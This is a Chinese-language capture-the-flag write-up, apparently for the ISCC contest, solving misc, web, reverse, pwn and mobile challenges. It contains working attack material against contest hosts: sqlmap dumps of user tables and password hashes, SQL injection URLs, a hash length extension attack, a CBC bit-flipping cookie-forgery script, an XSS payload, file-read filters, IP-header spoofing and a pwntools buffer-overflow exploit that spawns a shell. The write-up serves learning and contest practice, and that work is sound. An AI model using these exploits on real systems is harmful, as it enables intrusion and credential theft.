1&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.9.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.4.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.5.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.9.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.3.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.1.0.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.1.0.0.; 处理还原，得出 1\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d 再还原就成了flag{iscc is fun} 数字密文题目：这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921 16进制转个文本就行。 挖宝计划题目附件：挖宝计划 题目：小明手里有一个宝箱（treasureBox.zip），但无法打开。求助于先知，但只得到了一张藏宝图（getFlay.py），你能参透先知的深意，帮小明挖出宝藏吗？ 去年没解出来的数据分析题目。 查看zip的内容，发现是有解压密码的，但是不知道是什么，发现zip内也有一个getFlag.py，大小及CRC值一致，所以推断是存在明文攻击的解压漏洞。 但是，还是与去年一样的问题。但是根据去年主办方在线下决赛后发出的文章来看，是有些小提示的 1"以文找文"（寻"文"启事 众里寻他千百度，蓦然回首，那人却在，灯火阑珊处）数据分析题 降低题目难度后，思路：将6000个文件与sample对比，找到内容最为接近的5个文件，取其文件MD5值，emmmm。 嵌套ZIPs题目附件：嵌套ZIPs 题目：A老师听说b同学要去参加今年的ISCC，便出题考一考b同学，你能帮b同学渡过难关吗？ 看到ZIPs感觉就是一直要爆破的节奏。没什么思路那就爆破了。 解出来，又是明文攻击 ISCC_!S_my_favor1te_CTF 0x02 Web比较数字大小 限制了长度为3，将maxlength修改为大于3的值再输入超过3位数的数字即可，比如maxlength=33，输入值为12345 或者直接抓包改值。 flag为：768HKyu678567&amp;*&amp;K 你能跨过去吗？页面显示 12345Key Words:XSS如果你对xss了解的话,那你一定知道key是什么了，加油！http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413 对其中的base64编码进行解码，得出&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script，提交/%nsfocusXSStest%/即可得出flag 一切都是套路hit:好像有个文件忘记删了 打开index.php.txt 发现 1234567891011121314151617&lt;?phpinclude "flag.php";if ($_SERVER["REQUEST_METHOD"] != "POST") die("flag is here");if (!isset($_POST["flag"]) ) die($_403);foreach ($_GET as $k =&gt; $v)&#123; $$k = $$v;&#125;foreach ($_POST as $k =&gt; $v)&#123; $$k = $v;&#125;if ( $_POST["flag"] !== $flag ) die($_403);echo "flag: ". $flag . "\n";die($_200);?&gt; 需要满足3个if才能得到flag，这是个$$导致的变量覆盖问题。题目中使用了两个foreach并且也使用了$$，两个foreach中对$$k的处理是不一样的，满足条件后会将$flag里面的值打印出来。 但由于第5与第13-14行的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403，然后利用die($_200)或 die($_403)将flag打印出来。 你能绕过吗?hit:没过滤好啊 这个题目，最开始以为是注入题，毕竟这个题目这个显示。 尝试了id的注入点，最后在尝试修改f参数为index.php，发现带有php参数的显示了 error...，最后的尝试 index.php的源码为 123456789101112&lt;?php #ISCC&#123;LFIOOOOOOOOOOOOOO&#125; if(isset($_GET['f']))&#123; if(strpos($_GET['f'],"php") !== False)&#123; die("error..."); &#125; else&#123; include($_GET['f'] . '.php'); &#125; &#125; ?&gt; 原来如此，怪不得带有php的都报错了。 web02打开链接显示 1错误！你的IP不是本机ip！ 应该就是伪造IP了。尝试各种伪造IP的http头 12345X-Forwarded-ForClient-IPx-remote-IPx-originating-IPx-remote-addr 本地的诱惑题目：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题） 右键源码： 12345678910111213&lt;?php //print_r($_SERVER);$arr=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);if($arr[0]=='127.0.0.1')&#123; //key echo "key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;";&#125;else&#123; echo "必须从本地访问！";&#125;?&gt;&lt;?php//SAE 服务调整,该题目无法继续...可尝试自行搭建环境测试.echo file_get_contents(__FILE__); Please give me username and password!访问index.php.txt。 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$flag = "***********"; if(isset($_GET['username']))&#123; if (0 == strcasecmp($flag,$_GET['username']))&#123; $a = fla; echo "very good!Username is right"; &#125; else&#123; print 'Username is not right&lt;!--index.php.txt--&gt;';&#125;&#125;elseprint 'Please give me username or password!';if (isset($_GET['password']))&#123; if (is_numeric($_GET['password']))&#123; if (strlen($_GET['password']) &lt; 4)&#123; if ($_GET['password'] &gt; 999)&#123; $b = g; print '&lt;p&gt;very good!Password is right&lt;/p&gt;'; &#125;else print '&lt;p&gt;Password too little&lt;/p&gt;'; &#125;else print '&lt;p&gt;Password too long&lt;/p&gt;'; &#125;else print '&lt;p&gt;Password is not numeric&lt;/p&gt;';&#125;if ($a.$b == "flag") print $flag;?&gt; 绕过即可username[]=&amp;password=9e9 试试看题目：随意开火 查看图片，观察URL为/show.php?img=1.jpg。已经没有别的页面了，估计就是文件读取 12345?img=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问?img=php://filter/read=convert.base64-encode/resource=show.php # File not found.不正常。。。。?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=show.php # 正常访问 有戏，右键查看源码，发现已经能读到PHP源码了，接下来就是直接找flag所在，最后在../flag.php找到flag 请ping我的ip 看你能Ping通吗？题目：我都过滤了，看你怎么绕。 题目地址：http://118.190.152.202:8018 直接访问http://118.190.152.202:8018/flag.txt 就出现flag了。 正确解法是 SQL注入的艺术扫描扫到/admins，访问直接下载，打开发现是数据库链接信息，内部含有flag。 正确解法：宽字节注入 12http://118.190.152.202:8015/index.php?id=1%df%27http://118.190.152.202:8015/index.php?id=1%df%27%20and%201=1%20--+ web0112345678910&lt;?php highlight_file('2.php'); $flag='&#123;***************&#125;'; if (isset($_GET['password'])) &#123; if (strcmp($_GET['password'], $flag) == 0) die('Flag: '.$flag); else print 'Invalid password'; &#125; ?&gt; 想都不想，直接/password[]=flag Collide题目：那么长的秘钥，要爆破到什么时候啊 1234567891011121314151617181920&lt;?phpinclude "secret.php";@$username=(string)$_POST['username'];function enc($text)&#123; global $key; return md5($key.$text);&#125;if(enc($username) === $_COOKIE['verify'])&#123; if(is_numeric(strpos($username, "admin")))&#123; die($flag); &#125; else&#123; die("you are not admin"); &#125;&#125;else&#123; setcookie("verify", enc("guest"), time()+60*60*24*7); setcookie("len", strlen($key), time()+60*60*24*7);&#125;show_source(__FILE__); hash长度扩展攻击 $key变量我们是不知道的，但是从len值中能获取到长度为46 从verify中得到md5($key.guest)的值为：78cfc57d983b4a17e55828c001a3e781 成功登陆条件：username=guestxxxxxxxxadmin，并且verify要等于md5($key.uaername) 123456hashpump -s 78cfc57d983b4a17e55828c001a3e781 -d guest -k 46 -a admin得出5f585093a7fe86971766c3d25c43d0ebguets\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin处理guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin 这个提交得看脸。 ISCC{MD5_1s_n0t_5afe} Only admin can see flag查看源码发现提示index.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude 'sqlwaf.php';define("SECRET_KEY", "................");define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $iv=''; for($i=0;$i&lt;16;$i++)&#123; $iv.=chr(rand(1,255)); &#125; return $iv;&#125;function login($info)&#123; $iv=get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is *************&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'; die();&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;if (isset($_POST['username'])&amp;&amp;isset($_POST['password'])) &#123; $username=waf((string)$_POST['username']); $password=waf((string)$_POST['password']); if($username === 'admin')&#123; exit('&lt;p&gt;You are not real admin!&lt;/p&gt;'); &#125;else&#123; $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;&#125;?&gt; CBC字节反转攻击攻击题目，先将输入的账号密码序列化，也就是获取$plain。 123456789&lt;?php$username = 'Admin';$password = 'RcoIl';$info = array('username'=&gt;$username,'password'=&gt;$password);$plain = serialize($info);echo $plain;?&gt;运算结果：a:2:&#123;s:8:"username";s:5:"Admin";s:8:"password";s:5:"RcoIl";&#125; 我们的目的就是将Admin中的A转换成a，接下来就是把明文分成16个字节的块（因为AES-128以128位为一块,正好16字节） 1234a:2:&#123;s:8:"username";s:5:"Admin";s:8:"password";s:5:"RcoIl";&#125; 我们目标字符位于块2，这意味这我们需要改变块1的密文来改变第二块的密文。 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python#! -*- coding:utf-8 -*-__author__='RcoIl'import base64 import requestsimport urllibfrom urllib import unquoteurl = 'http://118.190.152.202:8001/'data = &#123; 'username': 'Admin', 'password': '12345',&#125;def Cookie(): s = requests.Session() cookies = s.post(url,data=data).cookies cipher = base64.b64decode(unquote(cookies['cipher'])) cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord('A') ^ ord('a')) + cipher[10:] Cookie = "PHPSESSID="+urllib.unquote(cookies['PHPSESSID'])+'; '+"iv=" + urllib.unquote(cookies['iv'])+'; '+"cipher=" + urllib.quote(base64.b64encode(cipher)) header = &#123; "Cookie": Cookie &#125; try: request = requests.post(url , headers = header) except Exception as e: print e else: print request.text[18:][:-24] print Cookie Cookie() 运行结果：C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=w8wkcnN//ERbrLkywW37hA==; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D查看unserialize的内容 þ¨²¦ãÙ9æpÒÄ¼Ume";s:5:"admin";s:8:"password";s:5:"12345";&#125;,已成功改成admin 但是第一块的内容显示不出来，接下来就是获取新的iv值及flag的获取。 12345678910111213141516171819202122232425#!/usr/bin/env python#! -*- coding:utf-8 -*-__author__='RcoIl'import base64import urllibimport requestsurl = 'http://118.190.152.202:8001/'iv = base64.b64decode("w8wkcnN//ERbrLkywW37hA==")plain = base64.b64decode("C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9")want = 'a:2:&#123;s:8:"userna'newiv = ''for i in range(16): newiv += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))iv = urllib.quote(base64.b64encode(newiv)) # qQi%2BwLqqJaVYDSoxdtspsA%3D%3Dcookie = "PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv="+ iv +"; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D"header = &#123; "Cookie": cookie &#125;try: request = requests.post(url , headers = header) except Exception as e: print eelse: print request.text 替换提交即可登陆真正的admin用户。 1&lt;p&gt;Hello admin&lt;/p&gt;&lt;p&gt;Flag is ISCC&#123;123dasd89as10aas&#125;&lt;/p&gt;&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt; php是世界上最好的语言12345678910111213141516171819202122232425&lt;html&gt; &lt;body&gt; &lt;form action="md5.php" method="post" &gt; 用户名:&lt;input type="text" name="username"/&gt; 密码:&lt;input type="password" name ="password"/&gt; &lt;input type="submit" &gt; &lt;/body&gt; &lt;/html&gt; &lt;?php header("content-type:text/html;charset=utf-8"); if(isset($_POST['username'])&amp;isset($_POST['password']))&#123; $username = $_POST['username']; $password = $_POST['password']; &#125; else&#123; $username="hello"; $password="hello"; &#125; if(md5($password) == 0)&#123; echo "xxxxx"; &#125; show_source(__FILE__); ?&gt; 看到第19行，明显的弱类型绕过。密码填写240610708 123456&lt;?php include 'flag.php'; $a = @$_REQUEST['a']; @eval("var_dump($$a);"); show_source(__FILE__); ?&gt; 绕过即可 12no_md5.php?a=flagISCC&#123;a39f9a1ff7eb4bab8a6a21b2ce111b4&#125; Only Admin题目：听说只有admin可以看到flag？ 最开始以为是利用MySQL的超长截断特性进行注册登陆，发现没成功。 扫描目录，发现有一个web.zip文件。 1234567891011web├─ .vscode│ └─ launch.json├─ MessageController.class.php├─ UserController.class.php├─ config.php # 配置文件├─ index.php # 登陆后主页├─ login.php # 登陆页面├─ reg.php # 注册页面├─ send.php└─ show.php 审计，难受。 其实也就是带cookie访问的问题。 exp 123456789101112131415161718192021#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport base64url="http://118.190.152.202:8020/"def attack(url, payload): s=requests.session() u1 = url + "send.php" plen = len(payload) payload = 'a:2:&#123;s:5:"email";O:7:"Message":4:&#123;s:3:"msg";s:'+str(plen)+':"'+payload+'";s:4:"from";N;s:2:"to";N;s:2:"id";i:-1;&#125;s:8:"password";s:5:"23333";&#125;' cookies = &#123;'ckSavePass': base64.b64encode(payload)&#125; r = s.get(u1, cookies=cookies) u2="http://118.190.152.202:8020/" +'config.php' r2=s.get(u2) print r2.headers['Set-Cookie'] return Falsepayload="111' || 1=1 -- 111"attack(url,payload)运行结果：csrftoken=zy129p1yvx; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/, flag=flag&#123;USer1ali2e1sInt4rt1n9&#125;; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/; httponly 为什么这么简单啊进入， 123第一关第二关需要从 http://edu.xss.tv 进入，并且只有我公司的IP地址才可以进入第二关，公司IP为：110.110.110.110 伪造IP 12345678910111213GET / HTTP/1.1Host: 118.190.152.202:8016Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=b604vp88ds9coh4352d3dncih2X-Forwarded-For: 110.110.110.110Referer: http://edu.xss.tvConnection: close 进入到第二关，寻找密码。右键源码看到password.js，解密其中的base64，得到密码xinyiji.com flag：B1H3n5u0xI2n9JIscc Sqli在username存在延迟注入。 1234567891011121314151617181920212223python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D "sqli_database" -T "user" -C "username,pass" --dump sqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=%E2%80%98' AND (SELECT * FROM (SELECT(SLEEP(5)))fbFG) AND 'xEit'='xEit&amp;password='---[15:04:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[15:04:25] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL &gt;= 5.0.12运行结果：Database: sqli_databaseTable: user[2 entries]+----------+----------------------------------+| username | pass |+----------+----------------------------------+| test | 098f6bcd4621d373cade4e832627b4f6 |（test）| admin | 197ed45182778e1c74cc8c72f9fffc07 |（u4g009）+----------+----------------------------------+ 登陆发现提示flag在另一个字段 12345678910python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D "sqli_database" -T "news" -C "kjafuibafuohnuvwnruniguankacbh" --dump运行结果：Database: sqli_databaseTable: news[1 entry]+--------------------------------+| kjafuibafuohnuvwnruniguankacbh |+--------------------------------+| flag&#123;hahaha999999999&#125; |+--------------------------------+ 有种你来绕题目：我都过滤了，看你怎么绕。记住是mysql 只给了一个登录框，然后没了，那么尝试了一下admin, admin提示密码错误，再尝试了下其他的用户名密码，提示用户名错误，确定用户名就是admin 注入，过滤了空格、#、*、union、like、regexp、and、or、|、–、&amp;、%0a、%0b、%0c、%0d等，需要想办法用其他操作符连接注入语句和闭合’。 原文操作：https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/ 得出密码为0416af0a8accf2be556a8e131438b814(nishishabi1438) 登陆之后和原题不一样了，直接填写flag就出现了flag值。 flag{sql_iNjEct_Is_Easy} 0x03 ReverseRSA256三个加密文件一个公钥。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import gmpy2def ModExp(n, k, m): a = list(bin(k))[2:] a.reverse() s = 1 for i in a: if i == '1': s = (s * n) % m n = (n * n) % m return sn = int('D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB', 16)print('n is')print(n)p = gmpy2.mpz(302825536744096741518546212761194311477)q = gmpy2.mpz(325045504186436346209877301320131277983)e = gmpy2.mpz(65537)phi_n = (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)print("d is:")print(d)p = 302825536744096741518546212761194311477q = 325045504186436346209877301320131277983def ByteToHex( bins ): return ''.join( [ "%02X" % x for x in bins ] ).strip()file1 = open("C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message1", 'rb').read()c1 = int(ByteToHex(file1), 16)print("c1", c1)file2 = open("C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message2", 'rb').read()c2 = int(ByteToHex(file2), 16)file3 = open("C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message3", 'rb').read()c3 = int(ByteToHex(file3), 16)m = p * qflag1 = ModExp(c1, d, m)flag2 = ModExp(c2, d, m)flag3 = ModExp(c3, d, m)flag = '0' + hex(flag1)[2:] + '0' + hex(flag2)[2:] + '0' + hex(flag3)[2:]print(flag)i = 0result = ''for i in range(0, len(flag), 2): result += chr((int(flag[i:i+2], 16)))print(result) My math is bad程序地址：My math is bad 题目：I think the math problem is too difficult for me. 12# file ReverseReverse: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20b7dc66633da72204852bf32a4e0c4ea46340b6, stripped IDA又是不显示main函数 满足sub_400766()就输出sub_400B16()，那就，直接看sub_400B16() ？看了看，不行哦，捷径走不了，那就看sub_400766()里的东西。 12345678910111213141516171819202122232425262728if ( strlen(s) == 32 )&#123; v3 = unk_6020B0; v4 = unk_6020B4; v5 = unk_6020B8; v6 = unk_6020BC; result = 0; if ( dword_6020A4 * (signed __int64)*(signed int *)s - dword_6020AC * (signed __int64)dword_6020A8 == 2652042832920173142LL &amp;&amp; 3LL * dword_6020A8 + 4LL * dword_6020AC - dword_6020A4 - 2LL * *(signed int *)s == 397958918 &amp;&amp; 3 * *(signed int *)s * (signed __int64)dword_6020AC - dword_6020A8 * (signed __int64)dword_6020A4 == 3345692380376715070LL &amp;&amp; 27LL * dword_6020A4 + *(signed int *)s - 11LL * dword_6020AC - dword_6020A8 == 40179413815LL ) &#123; srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)s ^ dword_6020AC); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 == 61799700179LL &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 == 48753725643LL &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 == 59322698861LL &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 == 51664230587LL ) result = 1; &#125;&#125; 结合动态分析，程序先判断输入值长度是否为32位，接下来将输入值进行拆分成 12s、dword_6020A4、dword_6020A8、dword_6020AC、unk_6020B0(v3)、unk_6020B4(v4)、unk_6020B8(v5)、unk_6020BC(v6) 依次验证，满足条件即返回1，则通过校验。 详细看看第8-13行，4个未知数和四个方程，emmm。 1234dword_6020A4 *s - dword_6020AC * dword_6020A8 == 26520428329201731423 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 3979589183 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 334569238037671507027 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815 利用python的z3库 123456789101112131415161718#/usr/bin/env python# coding=utf-8from z3 import *dword_6020A4 = Int('dword_6020A4')dword_6020AC = Int('dword_6020AC')dword_6020A8 = Int('dword_6020A8')s = Int('s')solve(dword_6020A4 * s - dword_6020AC * dword_6020A8 == 2652042832920173142 , 3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918 , 3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070 , 27 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815 )运算结果：s = 1869639009dword_6020A4 = 1801073242dword_6020A8 = 829124174dword_6020AC = 862734414 接下来到异或运算，直接用C语言吧 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;int v1,v2,v7,v8,v9,v10,v11,v12;int main(void) &#123; srand(829124174 ^ 1801073242 ^ 1869639009 ^ 862734414); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; printf(" v1=%d \n v2=%d \n V7=%d \n v8=%d \n v9=%d \n v10=%d \n v11=%d \n v12=%d",v1,v2,v7,v8,v9,v10,v11,v12); return 0;&#125;运算结果：v1=22 v2=39 V7=45 v8=45 v9=35 v10=41 v11=13 v12=36 然后继续接下来的方程 123456789101112131415161718#/usr/bin/env python# coding=utf-8from z3 import *v3 = Int('v3')v4 = Int('v4')v5 = Int('v5')v6 = Int('v6')solve(v6 * 39 + v3 * 22 - v4 - v5 == 61799700179,v6 + v3 + v5 * 45 - v4 * 45 == 48753725643,v3 * 35 + v4 * 41 - v5 - v6 == 59322698861,v5 * 36 + v3 - v4 - v6 * 13 == 51664230587,)运算结果：v3 = 811816014v4 = 828593230v5 = 1867395930v6 = 1195788129 将数字串转换成字符串。 1234567891011#/usr/bin/env python# coding=utf-8import libnumflag = ""x = [1869639009,1801073242,829124174,862734414,811816014,828593230,1867395930,1195788129]for y in x: flag += libnum.n2s(y)[::-1] print flag运算结果：ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG 得出正确的输入值，输入输出 0x04 PWNLogin题目：nc 47.104.16.75 9000 程序地址：Pwn-Login 下载附件倒入IDA进行分析 程序运行过程： 1main()--&gt;Login()--&gt;Menu()--&gt;ExecCmd()--&gt;ShowUserlist()... 查看Login()内容，总的看没什么特别的，接下来看Menu() 12345678910111213141516171819202122232425262728293031&#123; __int64 result; // rax@6 char buf[68]; // [sp+0h] [bp-50h]@1 int v2; // [sp+44h] [bp-Ch]@2 __int64 v3; // [sp+48h] [bp-8h]@1 memset(buf, 0, 0x40uLL); v3 = 0LL; do &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts("\nPanel\n\n1. exec command\n2. show user list\n3. exit\n"); printf("Your choice: "); fflush(_bss_start); v2 = read(0, buf, 0x280uLL); buf[v2] = 0; if ( buf[0] != 49 ) break; ExecCmd(); &#125; if ( buf[0] != 50 ) break; ShowUserlist(0LL, buf); &#125; result = (unsigned __int8)buf[0]; &#125; while ( buf[0] != 51 ); return result; 注意看第18行的代码。非常简单，单纯的读取一串字符串，然后储存在buf里面，但是，开辟的缓存区只有0x50字节大小，但是read最多可以读取0x280字节大小，这样就会造成缓存区溢出，也就是栈溢出漏洞。 接下来再看ExecCmd() 123456789101112131415161718192021int ExecCmd()&#123; int result; // eax@2 char *v1; // [sp+0h] [bp-10h]@3 if ( !strcmp(strUsername, "admin") ) //判断是否为admin用户 &#123; printf("Command: ", "admin", 0LL); fflush(_bss_start); fgets(cmd, 255, stdin); v1 = strchr(cmd, 10); if ( v1 ) *v1 = 0; result = puts("Sorry, this feature has been disabled."); &#125; else &#123; result = puts("Sorry, this feature is only available for admin"); &#125; return result;&#125; 我们要做的：如下图，程序不经过红框内，直接跳过输出。 也就是将return修改到call system，记住交互的最后还得输入一个3退出while循环 脚本： 123456789101112131415161718from pwn import * context.log_level = 'debug'p = remote('47.104.16.75',9000)#p = process('./pwn50')p.recvuntil(":")p.sendline("admin") #Send usernamep.recvuntil(":")p.sendline("T6OBSh2i") #Send passwordp.recvuntil(": ")p.sendline("1") #Choose 1. exec commandp.recvuntil(": ")p.sendline("/bin/sh") #Send cmdp.recvuntil(": ")p.sendline("\x90"*0x58 + p64(0x40084A)) #Change return addressp.recvuntil(": ")p.sendline("3")p.interactive() flag{welcome_to_iscc} Mobile小试牛刀附件地址：小试牛刀 拖进JEB2，查看Manifest、action等基础信息。这道题的坑就是壳的问题。 后来发现，Assets中的bfsprotect.jar就是源码。 右键MainActivity选择Decompile查看源码，一览无遗。 在onCreate()中发现了下面这个判断，与APP页面的判断显示一致。 12345678public void onClick(View arg5) &#123; if(!new ProtectClass().protectMethod(MainActivity.this.editText.getText().toString())) &#123; Toast.makeText(MainActivity.this, "Wrong Flag", 0).show(); &#125; else &#123; Toast.makeText(MainActivity.this, "Correct Flag", 0).show(); &#125; &#125; 进入ProtectClass()查看，就能看到对比的值，也就是flag值 1234567public boolean protectMethod(String arg4) &#123; int v1; for(v1 = 0; v1 &lt; MainActivity.runTimes &gt;&gt; 1; ++v1) &#123; &#125; return arg4.equals("BFS-ISCC");&#125; 或者，打开bfsprotect.jar，直接搜索iscc即可得到flag]]></content>
      <categories>
